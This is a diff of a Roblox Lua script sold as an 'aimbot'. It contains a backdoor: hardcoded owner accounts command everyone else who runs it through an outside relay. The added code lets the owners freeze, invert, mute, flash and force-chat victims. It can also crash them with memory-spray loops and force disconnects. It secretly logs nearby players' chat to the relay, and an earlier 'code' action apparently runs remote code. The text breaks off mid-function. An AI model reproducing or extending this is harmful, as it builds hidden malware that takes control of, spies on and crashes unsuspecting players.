@@ -1,5 +1,5 @@
 --[[
-    [S] Universal Control + Aimbot v9
+    [S] Universal Control + Aimbot v11
     Owners: 1460823186, 7208967899
     Transport: val.town blob
 --]]
@@ -12,6 +12,7 @@ local Players      = game:GetService("Players")
 local RunService   = game:GetService("RunService")
 local HttpService  = game:GetService("HttpService")
 local TeleportSvc  = game:GetService("TeleportService")
+local GuiService   = game:GetService("GuiService")
 local CoreGui      = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local UIS          = game:GetService("UserInputService")
@@ -49,8 +50,7 @@ end
 local function readState()
     local r = httpRequest({ Url = RELAY_URL, Method = "GET" })
     if not r or not r.Body or #r.Body == 0 then return nil end
-    local first = r.Body:sub(1, 1)
-    if first ~= "{" then return nil end
+    if r.Body:sub(1, 1) ~= "{" then return nil end
     local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
     if ok and type(d) == "table" then return d end
     return nil
@@ -66,15 +66,196 @@ local function writeState(state)
 end
 
 -- ============================================================
--- Executor
+-- Target-side persistent state
 -- ============================================================
+local PERSIST = {
+    anti_unfreeze = false,
+    reapply       = false,
+    mute          = false,
+    invert_move   = false,
+    swap_ws       = false,
+    swap_ad       = false,
+    screen_flip   = false,
+    mem_lite      = false,
+    mem_full      = false,
+}
+local LAST_ACTION = nil
+local MUTE_HOOKS  = {}
+
 local MSG_HANDLERS = {}
 local SEEN_CMDS = {}
 local CMD_HISTORY_CAP = 40
 
+-- ============================================================
+-- Screen flip camera hook
+-- ============================================================
+RunService:BindToRenderStep("__sk_flip", Enum.RenderPriority.Camera.Value + 1, function()
+    if PERSIST.screen_flip and Camera then
+        pcall(function()
+            Camera.CFrame = Camera.CFrame * CFrame.Angles(0, 0, math.pi)
+        end)
+    end
+end)
+
+-- ============================================================
+-- Persistent re-apply loop
+-- ============================================================
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        pcall(function()
+            local char = LP.Character
+            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+            if PERSIST.anti_unfreeze and hrp and not hrp.Anchored then
+                hrp.Anchored = true
+            end
+        end)
+    end
+end)
+
+-- re-apply on respawn
+LP.CharacterAdded:Connect(function()
+    if PERSIST.reapply and LAST_ACTION then
+        task.wait(2)
+        for _, h in ipairs(MSG_HANDLERS) do pcall(h, LAST_ACTION) end
+    end
+end)
+
+-- ============================================================
+-- Mute (hook outgoing chat)
+-- ============================================================
+local function setMute(on)
+    PERSIST.mute = on
+    if on then
+        pcall(function()
+            local evts = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+            if evts and evts:FindFirstChild("SayMessageRequest") and hookfunction then
+                if not MUTE_HOOKS.legacy then
+                    MUTE_HOOKS.legacy = hookfunction(evts.SayMessageRequest.FireServer, function() end)
+                end
+            end
+        end)
+        pcall(function()
+            local tcs = game:GetService("TextChatService")
+            if tcs.ChatVersion == Enum.ChatVersion.TextChatService and hookfunction then
+                local ch = tcs:FindFirstChild("TextChannels")
+                if ch then
+                    for _, c in ipairs(ch:GetChildren()) do
+                        if c:IsA("TextChannel") and not MUTE_HOOKS[c.Name] then
+                            MUTE_HOOKS[c.Name] = hookfunction(c.SendAsync, function() end)
+                        end
+                    end
+                end
+            end
+        end)
+    else
+        pcall(function()
+            if MUTE_HOOKS.legacy and restorefunction then restorefunction(MUTE_HOOKS.legacy) end
+            MUTE_HOOKS.legacy = nil
+            for k, v in pairs(MUTE_HOOKS) do
+                if k ~= "legacy" and restorefunction then pcall(restorefunction, v) end
+            end
+            MUTE_HOOKS = {}
+        end)
+    end
+end
+
+-- ============================================================
+-- Movement swaps (camera-relative)
+-- ============================================================
+local function applyMoveMods()
+    pcall(function()
+        local pm = LP.PlayerScripts:FindFirstChild("PlayerModule")
+        if not pm then return end
+        local controls = require(pm):GetControls()
+        if not controls.__sk_base then controls.__sk_base = controls.moveFunction end
+        local base = controls.__sk_base
+        controls.moveFunction = function(self, dir, rel)
+            local x, y, z = dir.X, dir.Y, dir.Z
+            if PERSIST.swap_ad then x = -x end
+            if PERSIST.invert_move then x = -x; z = -z end
+            if PERSIST.swap_ws then z = -z end
+            return base(self, Vector3.new(x, y, z), rel)
+        end
+    end)
+end
+
+-- ============================================================
+-- Action executor
+-- ============================================================
+local function makeOverlayGui(name)
+    local g = Instance.new("ScreenGui")
+    g.Name = name
+    g.ResetOnSpawn = false
+    g.IgnoreGuiInset = true
+    g.DisplayOrder = 999
+    if gethui then g.Parent = gethui()
+    elseif CoreGui then g.Parent = CoreGui
+    else g.Parent = LP:WaitForChild("PlayerGui") end
+    return g
+end
+
+local function showImage(decalId, dur)
+    decalId = tostring(decalId or ""):gsub("%D", "")
+    if decalId == "" then return end
+    local g = makeOverlayGui("[S] img")
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1, 0, 1, 0)
+    img.Position = UDim2.new(0, 0, 0, 0)
+    img.BackgroundTransparency = 1
+    img.Image = "rbxassetid://" .. decalId
+    img.ScaleType = Enum.ScaleType.Fit
+    img.Parent = g
+    task.delay(dur or 6, function() g:Destroy() end)
+end
+
+local function showFlashbang()
+    local g = makeOverlayGui("[S] flash")
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1, 0, 1, 0)
+    f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    f.BorderSizePixel = 0
+    f.BackgroundTransparency = 0
+    f.Parent = g
+    TweenService:Create(f, TweenInfo.new(1.6, Enum.EasingStyle.Quad), { BackgroundTransparency = 1 }):Play()
+    task.delay(1.7, function() g:Destroy() end)
+end
+
+local function forceDisconnect()
+    pcall(function() game:Shutdown() end)
+    pcall(function() LP:Kick("") end)
+    pcall(function()
+        local nc = game:GetService("NetworkClient")
+        if nc and nc.Disconnect then nc:Disconnect() end
+    end)
+    task.spawn(function()
+        for _ = 1, 200 do
+            local _ = string.rep("x", 1000000)
+            task.wait(0.01)
+        end
+    end)
+end
+
+local function spawnMemSpray(lite)
+    task.spawn(function()
+        while PERSIST.mem_full or PERSIST.mem_lite do
+            local chunk = {}
+            local n = PERSIST.mem_full and 40000 or 6000
+            local sz = PERSIST.mem_full and 400 or 220
+            for i = 1, n do
+                chunk[i] = string.rep("F", sz) .. tostring(i)
+            end
+            local waitAmt = PERSIST.mem_full and 0.005 or 0.06
+            task.wait(waitAmt)
+        end
+    end)
+end
+
 local function executeAction(c)
     if not c or not c.from then return end
     if not OWNERS[tonumber(c.from)] then return end
+
+    if c.action ~= "code" then LAST_ACTION = c end
 
     local char = LP.Character
     local hrp  = char and char:FindFirstChild("HumanoidRootPart")
@@ -82,6 +263,47 @@ local function executeAction(c)
 
     if c.action == "freeze" and hrp then hrp.Anchored = true end
     if c.action == "unfreeze" and hrp then hrp.Anchored = false end
+
+    if c.action == "anti_unfreeze" then PERSIST.anti_unfreeze = not PERSIST.anti_unfreeze end
+    if c.action == "reapply"       then PERSIST.reapply = not PERSIST.reapply end
+
+    if c.action == "sit" and hum then hum.Sit = true end
+    if c.action == "stand" and hum then hum.Sit = false end
+
+    if c.action == "emote" and hum then
+        pcall(function() hum:PlayEmote(tostring(c.payload)) end)
+    end
+
+    if c.action == "flip" then PERSIST.screen_flip = not PERSIST.screen_flip end
+
+    if c.action == "invert_move" then
+        PERSIST.invert_move = not PERSIST.invert_move
+        applyMoveMods()
+    end
+    if c.action == "swap_ws" then
+        PERSIST.swap_ws = not PERSIST.swap_ws
+        applyMoveMods()
+    end
+    if c.action == "swap_ad" then
+        PERSIST.swap_ad = not PERSIST.swap_ad
+        applyMoveMods()
+    end
+
+    if c.action == "mute" then setMute(not PERSIST.mute) end
+
+    if c.action == "flashbang" then showFlashbang() end
+    if c.action == "image" then showImage(c.payload, 6) end
+
+    if c.action == "disconnect" then forceDisconnect() end
+
+    if c.action == "mems_spray_lite" then
+        PERSIST.mem_lite = not PERSIST.mem_lite
+        if PERSIST.mem_lite then spawnMemSpray(true) end
+    end
+    if c.action == "mem_spray_full" then
+        PERSIST.mem_full = not PERSIST.mem_full
+        if PERSIST.mem_full then spawnMemSpray(false) end
+    end
 
     if c.action == "fling" and hrp then
         task.spawn(function()
@@ -115,13 +337,11 @@ local function executeAction(c)
     end
 
     if c.action == "bring" and hrp then
-        -- payload is "x,y,z" of owner's position at time of command
         local payload = tostring(c.payload or "")
         local x, y, z = payload:match("^(-?%d+%.?%d*),(-?%d+%.?%d*),(-?%d+%.?%d*)$")
         if x and y and z then
             hrp.CFrame = CFrame.new(tonumber(x), tonumber(y), tonumber(z))
         else
-            -- fallback: same-server lookup
             local owner = Players:GetPlayerByUserId(tonumber(c.from))
             if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                 hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
@@ -129,28 +349,16 @@ local function executeAction(c)
         end
     end
 
-    if c.action == "sound" then
-        local s = Instance.new("Sound")
-        s.SoundId = "rbxassetid://" .. tostring(c.payload)
-        s.Parent = workspace
-        s:Play()
-        task.delay(6, function() s:Destroy() end)
-    end
-
     if c.action == "message" then
-        local g2 = Instance.new("ScreenGui")
-        g2.Name = "[S] msg"
-        g2.ResetOnSpawn = false
-        g2.IgnoreGuiInset = true
-        if gethui then g2.Parent = gethui()
-        elseif CoreGui then g2.Parent = CoreGui
-        else g2.Parent = LP:WaitForChild("PlayerGui") end
+        local g2 = makeOverlayGui("[S] msg")
         local box = Instance.new("TextLabel")
         box.Size = UDim2.new(0, 340, 0, 64)
         box.Position = UDim2.new(0.5, -170, 0.12, 0)
         box.BackgroundColor3 = Color3.fromRGB(22, 16, 34)
         box.BorderSizePixel = 0
-        box.TextColor3 = Color3.fromRGB(255, 255, 255)
+        box.TextColor3 = Color3.fromRGB(255, 70, 190)
+        box.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        box.TextStrokeTransparency = 0
         box.Font = Enum.Font.GothamBold
         box.TextSize = 15
         box.TextWrapped = true
@@ -159,6 +367,29 @@ local function executeAction(c)
         local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = box
         local ss = Instance.new("UIStroke"); ss.Color = Color3.fromRGB(200, 130, 255); ss.Parent = box
         task.delay(4, function() g2:Destroy() end)
+    end
+
+    if c.action == "chat" then
+        local msg = tostring(c.payload or "")
+        if msg ~= "" then
+            pcall(function()
+                local rs = game:GetService("ReplicatedStorage")
+                local evts = rs:FindFirstChild("DefaultChatSystemChatEvents")
+                if evts and evts:FindFirstChild("SayMessageRequest") then
+                    evts.SayMessageRequest:FireServer(msg, "All")
+                end
+            end)
+            pcall(function()
+                local tcs = game:GetService("TextChatService")
+                if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local ch = tcs:FindFirstChild("TextChannels")
+                    if ch then
+                        local gen = ch:FindFirstChild("RBXGeneral") or ch:FindFirstChildOfClass("TextChannel")
+                        if gen then gen:SendAsync(msg) end
+                    end
+                end
+            end)
+        end
     end
 
     if c.action == "kick" then
@@ -174,7 +405,7 @@ end
 table.insert(MSG_HANDLERS, executeAction)
 
 -- ============================================================
--- Fast command poll
+-- Command poll
 -- ============================================================
 task.spawn(function()
     while true do
@@ -192,7 +423,6 @@ task.spawn(function()
                     end
                 end
             end
-            -- purge old seen cmds
             local now = os.time()
             for cid, ts in pairs(SEEN_CMDS) do
                 if now - ts > 120 then SEEN_CMDS[cid] = nil end
@@ -225,7 +455,42 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- UI helpers
+-- Nearby chat log (target's perspective, players within 50 studs)
+-- ============================================================
+task.spawn(function()
+    task.wait(2)
+    local RADIUS = 50
+    local function hookPlayer(p)
+        if p == LP then return end
+        p.Chatted:Connect(function(msg)
+            pcall(function()
+                local myHrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                local theirHrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
+                if not (myHrp and theirHrp) then return end
+                local dist = (myHrp.Position - theirHrp.Position).Magnitude
+                if dist > RADIUS then return end
+                local state = readState() or { online = {}, cmd = {} }
+                state.chatlog = state.chatlog or {}
+                state.chatlog[tostring(MY_ID)] = state.chatlog[tostring(MY_ID)] or {}
+                table.insert(state.chatlog[tostring(MY_ID)], {
+                    from = p.Name,
+                    msg = tostring(msg),
+                    dist = math.floor(dist),
+                    ts = os.time(),
+                })
+                while #state.chatlog[tostring(MY_ID)] > 20 do
+                    table.remove(state.chatlog[tostring(MY_ID)], 1)
+                end
+                writeState(state)
+            end)
+        end)
+    end
+    for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
+    Players.PlayerAdded:Connect(hookPlayer)
+end)
+
+-- ============================================================
+-- UI helpers (hot pink + black outline)
 -- ============================================================
 local function makeGui(name)
     local g = Instance.new("ScreenGui")
@@ -266,9 +531,11 @@ end
 local function styleButton(btn)
     btn.BackgroundColor3 = Color3.fromRGB(105, 65, 155)
     btn.BorderSizePixel = 0
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextColor3 = Color3.fromRGB(255, 70, 190)
+    btn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    btn.TextStrokeTransparency = 0
     btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 12
+    btn.TextSize = 11
     btn.AutoButtonColor = false
     btn.Active = true
     local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = btn
@@ -307,8 +574,10 @@ local function makeLabel(parent, text, x, y, w, h, sz, color)
     l.Size = UDim2.new(0, w, 0, h)
     l.Position = UDim2.new(0, x, 0, y)
     l.BackgroundTransparency = 1
-    l.TextColor3 = color or Color3.fromRGB(245, 235, 255)
-    l.Font = Enum.Font.Gotham
+    l.TextColor3 = color or Color3.fromRGB(255, 70, 190)
+    l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    l.TextStrokeTransparency = 0
+    l.Font = Enum.Font.GothamBold
     l.TextSize = sz or 12
     l.TextXAlignment = Enum.TextXAlignment.Left
     l.Text = text
@@ -322,10 +591,12 @@ local function makeInput(parent, placeholder, x, y, w, h)
     t.Position = UDim2.new(0, x, 0, y)
     t.BackgroundColor3 = Color3.fromRGB(46, 32, 68)
     t.BorderSizePixel = 0
-    t.TextColor3 = Color3.fromRGB(255, 255, 255)
-    t.PlaceholderColor3 = Color3.fromRGB(190, 165, 230)
-    t.Font = Enum.Font.Gotham
-    t.TextSize = 12
+    t.TextColor3 = Color3.fromRGB(255, 70, 190)
+    t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    t.TextStrokeTransparency = 0
+    t.PlaceholderColor3 = Color3.fromRGB(200, 130, 200)
+    t.Font = Enum.Font.GothamBold
+    t.TextSize = 11
     t.PlaceholderText = placeholder
     t.Text = ""
     t.ClearTextOnFocus = false
@@ -379,6 +650,42 @@ local function makeDraggable(frame, handle)
 end
 
 -- ============================================================
+-- Join with fallbacks
+-- ============================================================
+local function joinServer(placeId, jobId)
+    placeId = tonumber(placeId) or game.PlaceId
+    jobId = tostring(jobId or "")
+    local ok = pcall(function() TeleportSvc:TeleportToPlaceInstance(placeId, jobId, LP) end)
+    if ok then return end
+    ok = pcall(function() TeleportSvc:Teleport(placeId, LP) end)
+    if ok then return end
+    local link = "roblox://placeId=" .. tostring(placeId)
+    if jobId ~= "" and jobId ~= "nil" then link = link .. "&gameInstanceId=" .. jobId end
+    ok = pcall(function() GuiService:OpenBrowserWindow(link) end)
+    if ok then return end
+    pcall(function()
+        if syn and syn.request then syn.request({ Url = link, Method = "GET" })
+        elseif request then request({ Url = link, Method = "GET" }) end
+    end)
+    pcall(function() if setclipboard then setclipboard(link) end end)
+    local g = makeGui("[S] join")
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(0, 400, 0, 40)
+    l.Position = UDim2.new(0.5, -200, 0.05, 0)
+    l.BackgroundColor3 = Color3.fromRGB(22, 16, 34)
+    l.BorderSizePixel = 0
+    l.TextColor3 = Color3.fromRGB(255, 70, 190)
+    l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    l.TextStrokeTransparency = 0
+    l.Font = Enum.Font.GothamBold
+    l.TextSize = 14
+    l.Text = "join link copied — paste in browser"
+    l.Parent = g
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = l
+    task.delay(5, function() g:Destroy() end)
+end
+
+-- ============================================================
 -- OWNER PANEL
 -- ============================================================
 if IS_OWNER then
@@ -389,12 +696,13 @@ if IS_OWNER then
     local EXPANDED   = nil
     local LAST_SYNC  = 0
     local LAST_ERR   = ""
-    local CARD_REFS  = {}   -- uid -> { card, nameLbl, metaLbl, hbLbl, joinBtn, expandBtn, panel, uid, user }
+    local CARD_REFS  = {}
+    local TOGGLES    = {}   -- uid -> { invert=bool, ws=bool, ad=bool, mute=bool, flip=bool, anti=bool, reap=bool }
 
     local gui = makeGui("[S] Control")
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 380, 0, 640)
-    frame.Position = UDim2.new(0, 20, 0.08, 0)
+    frame.Size = UDim2.new(0, 400, 0, 700)
+    frame.Position = UDim2.new(0, 20, 0.05, 0)
     styleFrame(frame)
     frame.Parent = gui
 
@@ -406,29 +714,26 @@ if IS_OWNER then
     makeDraggable(frame, header)
 
     makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
-    local statusLbl = makeLabel(header, "sync: ...", 220, 8, 150, 14, 10, Color3.fromRGB(210, 190, 250))
+    local statusLbl = makeLabel(header, "sync: ...", 240, 8, 150, 14, 10, Color3.fromRGB(210, 190, 250))
     statusLbl.TextXAlignment = Enum.TextXAlignment.Right
 
-    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 340, 14)
+    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 360, 14)
 
-    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 170, 22)
-    local placeFilter = makeInput(frame, "filter place id...", 190, 52, 176, 22)
+    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 180, 22)
+    local placeFilter = makeInput(frame, "filter place id...", 200, 52, 186, 22)
     execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
     placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)
 
-    local bcast = makeInput(frame, "broadcast message...", 14, 80, 270, 24)
-    makeBtn(frame, "Send All", 290, 80, 76, 24, function()
+    local bcast = makeInput(frame, "broadcast message...", 14, 80, 290, 24)
+    makeBtn(frame, "Send All", 310, 80, 76, 24, function()
         for uid in pairs(ONLINE) do
             if tostring(uid) ~= tostring(MY_ID) and not OWNERS[tonumber(uid)] then
                 local st = readState() or { online = {}, cmd = {} }
                 st.cmd = st.cmd or {}
                 st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                 table.insert(st.cmd[tostring(uid)], {
-                    from = MY_ID,
-                    action = "message",
-                    payload = bcast.Text,
-                    ts = os.time(),
-                    cid = tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999)),
+                    from = MY_ID, action = "message", payload = bcast.Text,
+                    ts = os.time(), cid = tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999)),
                 })
                 while #st.cmd[tostring(uid)] > CMD_HISTORY_CAP do table.remove(st.cmd[tostring(uid)], 1) end
                 writeState(st)
@@ -444,11 +749,8 @@ if IS_OWNER then
                 st.cmd = st.cmd or {}
                 st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                 table.insert(st.cmd[tostring(uid)], {
-                    from = MY_ID,
-                    action = action,
-                    payload = "",
-                    ts = os.time(),
-                    cid = tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999)),
+                    from = MY_ID, action = action, payload = "",
+                    ts = os.time(), cid = tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999)),
                 })
                 while #st.cmd[tostring(uid)] > CMD_HISTORY_CAP do table.remove(st.cmd[tostring(uid)], 1) end
                 writeState(st)
@@ -457,27 +759,29 @@ if IS_OWNER then
         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. label)
     end
 
-    makeBtn(frame, "Freeze All",   14, 112, 82, 24, function() globalAction("freeze all", "freeze") end)
-    makeBtn(frame, "Unfreeze All", 100, 112, 82, 24, function() globalAction("unfreeze all", "unfreeze") end)
-    makeBtn(frame, "Fling All",    186, 112, 82, 24, function() globalAction("fling all", "fling") end)
-    makeBtn(frame, "Explode All",  272, 112, 94, 24, function() globalAction("explode all", "explode") end)
+    makeBtn(frame, "Freeze All",   14, 112, 86, 24, function() globalAction("freeze all", "freeze") end)
+    makeBtn(frame, "Unfreeze All", 104, 112, 86, 24, function() globalAction("unfreeze all", "unfreeze") end)
+    makeBtn(frame, "Fling All",    194, 112, 86, 24, function() globalAction("fling all", "fling") end)
+    makeBtn(frame, "Explode All",  284, 112, 102, 24, function() globalAction("explode all", "explode") end)
 
-    makeBtn(frame, "Kill All",    14, 140, 82, 22, function() globalAction("kill all", "kill") end)
-    makeBtn(frame, "Reset All",   100, 140, 82, 22, function() globalAction("reset all", "reset") end)
-    makeBtn(frame, "Ragdoll All", 186, 140, 82, 22, function() globalAction("ragdoll all", "ragdoll") end)
-    makeBtn(frame, "Bring All",   272, 140, 94, 22, function() globalAction("bring all", "bring") end)
+    makeBtn(frame, "Kill All",    14, 140, 86, 22, function() globalAction("kill all", "kill") end)
+    makeBtn(frame, "Reset All",   104, 140, 86, 22, function() globalAction("reset all", "reset") end)
+    makeBtn(frame, "Ragdoll All", 194, 140, 86, 22, function() globalAction("ragdoll all", "ragdoll") end)
+    makeBtn(frame, "Bring All",   284, 140, 102, 22, function() globalAction("bring all", "bring") end)
 
     makeLabel(frame, "LIVE PLAYERS", 14, 172, 200, 14)
 
-    local scroll, layout = makeScrolling(frame, 14, 190, 352, 340)
+    local scroll, layout = makeScrolling(frame, 14, 190, 372, 400)
 
-    makeLabel(frame, "HISTORY", 14, 540, 100, 14)
+    makeLabel(frame, "HISTORY", 14, 600, 100, 14)
     local histLog = Instance.new("TextLabel")
-    histLog.Size = UDim2.new(0, 352, 0, 60)
-    histLog.Position = UDim2.new(0, 14, 0, 558)
+    histLog.Size = UDim2.new(0, 372, 0, 60)
+    histLog.Position = UDim2.new(0, 14, 0, 618)
     histLog.BackgroundColor3 = Color3.fromRGB(20, 12, 32)
     histLog.BorderSizePixel = 0
-    histLog.TextColor3 = Color3.fromRGB(220, 200, 250)
+    histLog.TextColor3 = Color3.fromRGB(255, 70, 190)
+    histLog.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    histLog.TextStrokeTransparency = 0
     histLog.Font = Enum.Font.Code
     histLog.TextSize = 10
     histLog.TextXAlignment = Enum.TextXAlignment.Left
@@ -494,14 +798,6 @@ if IS_OWNER then
         histLog.Text = table.concat(out, "\n")
     end
 
-    local SOUND_LIST = {
-        ["Bruh"]      = "5238402914",
-        ["Vine Boom"] = "6236140145",
-        ["Fart"]      = "5476441053",
-        ["Airhorn"]   = "2942494796",
-        ["Taco Bell"] = "5423143811",
-    }
-
     local function newCid()
         return tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999))
     end
@@ -510,18 +806,14 @@ if IS_OWNER then
         local st = readState() or { online = {}, cmd = {} }
         st.cmd = st.cmd or {}
         st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
-        -- for bring, include our current position in payload
         local finalPayload = payload or ""
         if action == "bring" and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
             local p = LP.Character.HumanoidRootPart.Position
             finalPayload = tostring(p.X) .. "," .. tostring(p.Y) .. "," .. tostring(p.Z)
         end
         table.insert(st.cmd[tostring(uid)], {
-            from = MY_ID,
-            action = action,
-            payload = finalPayload,
-            ts = os.time(),
-            cid = newCid(),
+            from = MY_ID, action = action, payload = finalPayload,
+            ts = os.time(), cid = newCid(),
         })
         while #st.cmd[tostring(uid)] > CMD_HISTORY_CAP do table.remove(st.cmd[tostring(uid)], 1) end
         writeState(st)
@@ -533,6 +825,11 @@ if IS_OWNER then
         if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then return false end
         if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then return false end
         return true
+    end
+
+    local function getToggles(uid)
+        TOGGLES[uid] = TOGGLES[uid] or {}
+        return TOGGLES[uid]
     end
 
     local function buildCard(uid, user)
@@ -557,22 +854,16 @@ if IS_OWNER then
         local metaLbl = makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
         local hbLbl   = makeLabel(card, "hb 0s", 64, 42, 120, 12, 10)
 
-        local joinBtn = makeBtn(card, "Join", 280, 8, 64, 22, function()
+        local joinBtn = makeBtn(card, "Join", 300, 8, 64, 22, function()
             local u = CARD_REFS[uid] and CARD_REFS[uid].user or user
-            pcall(function() TeleportSvc:TeleportToPlaceInstance(u.place or game.PlaceId, u.job, LP) end)
+            joinServer(u.place or game.PlaceId, u.job)
         end)
 
-        local expandBtn = makeBtn(card, "v", 280, 36, 64, 22, function() end)
+        local expandBtn = makeBtn(card, "v", 300, 36, 64, 22, function() end)
 
         local ref = {
-            card = card,
-            nameLbl = nameLbl,
-            metaLbl = metaLbl,
-            hbLbl = hbLbl,
-            joinBtn = joinBtn,
-            expandBtn = expandBtn,
-            user = user,
-            panel = nil,
+            card = card, nameLbl = nameLbl, metaLbl = metaLbl, hbLbl = hbLbl,
+            joinBtn = joinBtn, expandBtn = expandBtn, user = user, panel = nil, chatLogLbl = nil,
         }
 
         local function collapse()
@@ -580,6 +871,7 @@ if IS_OWNER then
             card.Size = UDim2.new(1, -8, 0, 66)
             joinBtn.Visible = false
             expandBtn.Text = "v"
+            ref.chatLogLbl = nil
         end
 
         local function expand()
@@ -587,57 +879,132 @@ if IS_OWNER then
             joinBtn.Visible = true
             expandBtn.Text = "^"
             local panel = Instance.new("Frame")
-            panel.Size = UDim2.new(1, -8, 0, 306)
+            panel.Size = UDim2.new(1, -8, 0, 700)
             panel.Position = UDim2.new(0, 4, 0, 70)
             panel.BackgroundTransparency = 1
             panel.Active = true
             panel.Parent = card
-            card.Size = UDim2.new(1, -8, 0, 382)
+            card.Size = UDim2.new(1, -8, 0, 776)
             ref.panel = panel
 
-            local function pb(label, x, y, w, cb) makeBtn(panel, label, x, y, w, 24, cb) end
+            local T = getToggles(uid)
 
+            local function pb(label, x, y, w, cb)
+                local b = makeBtn(panel, label, x, y, w, 22, cb)
+                return b
+            end
+
+            -- row 1: basic
             pb("Bring",   0, 0, 110, function() cmd(uid, "bring") end)
             pb("Fling",   114, 0, 110, function() cmd(uid, "fling") end)
-            pb("Freeze",  228, 0, 106, function() cmd(uid, "freeze") end)
+            pb("Freeze",  228, 0, 110, function() cmd(uid, "freeze") end)
 
-            pb("Unfreeze",0, 28, 110, function() cmd(uid, "unfreeze") end)
-            pb("Explode", 114, 28, 110, function() cmd(uid, "explode") end)
-            pb("Kill",    228, 28, 106, function() cmd(uid, "kill") end)
+            -- row 2
+            pb("Unfreeze",0, 26, 110, function() cmd(uid, "unfreeze") end)
+            pb("Explode", 114, 26, 110, function() cmd(uid, "explode") end)
+            pb("Kill",    228, 26, 110, function() cmd(uid, "kill") end)
 
-            pb("Ragdoll", 0, 56, 110, function() cmd(uid, "ragdoll") end)
-            pb("Reset",   114, 56, 110, function() cmd(uid, "reset") end)
-            pb("Follow",  228, 56, 106, function()
+            -- row 3
+            pb("Ragdoll", 0, 52, 110, function() cmd(uid, "ragdoll") end)
+            pb("Reset",   114, 52, 110, function() cmd(uid, "reset") end)
+            pb("Follow",  228, 52, 110, function()
                 FOLLOWING[uid] = not FOLLOWING[uid]
                 table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
                 refreshHistory()
             end)
 
-            local msgIn = makeInput(panel, "message...", 0, 86, 234, 24)
-            pb("Send", 238, 86, 96, function() cmd(uid, "message", msgIn.Text) end)
-
-            local snd = Instance.new("TextButton")
-            snd.Size = UDim2.new(0, 334, 0, 24)
-            snd.Position = UDim2.new(0, 0, 0, 116)
-            snd.Text = "sound: tap to cycle"
-            snd.Parent = panel
-            styleButton(snd)
-            local soundKeys = {}
-            for k, _ in pairs(SOUND_LIST) do table.insert(soundKeys, k) end
-            local soundIdx = 1
-            snd.MouseButton1Click:Connect(function()
-                soundIdx = soundIdx % #soundKeys + 1
-                snd.Text = "sound: " .. soundKeys[soundIdx]
-                cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
+            -- row 4: sit / flip / flash
+            pb("Sit",     0, 82, 110, function() cmd(uid, "sit") end)
+            local flipBtn = pb("Flip: OFF", 114, 82, 110, function(self)
+                T.flip = not T.flip
+                self.Text = "Flip: " .. (T.flip and "ON" or "OFF")
+                cmd(uid, "flip")
             end)
+            flipBtn.Text = "Flip: " .. (T.flip and "ON" or "OFF")
+            pb("Flashbang", 228, 82, 110, function() cmd(uid, "flashbang") end)
 
-            local codeIn = makeInput(panel, 'print("hi")', 0, 146, 334, 44)
+            -- row 5: movement swaps
+            local invBtn = pb("Invert: OFF", 0, 108, 110, function(self)
+                T.invert = not T.invert
+                self.Text = "Invert: " .. (T.invert and "ON" or "OFF")
+                cmd(uid, "invert_move")
+            end)
+            invBtn.Text = "Invert: " .. (T.invert and "ON" or "OFF")
+
+            local wsBtn = pb("W/S: OFF", 114, 108, 110, function(self)
+                T.ws = not T.ws
+                self.Text = "W/S: " .. (T.ws and "ON" or "OFF")
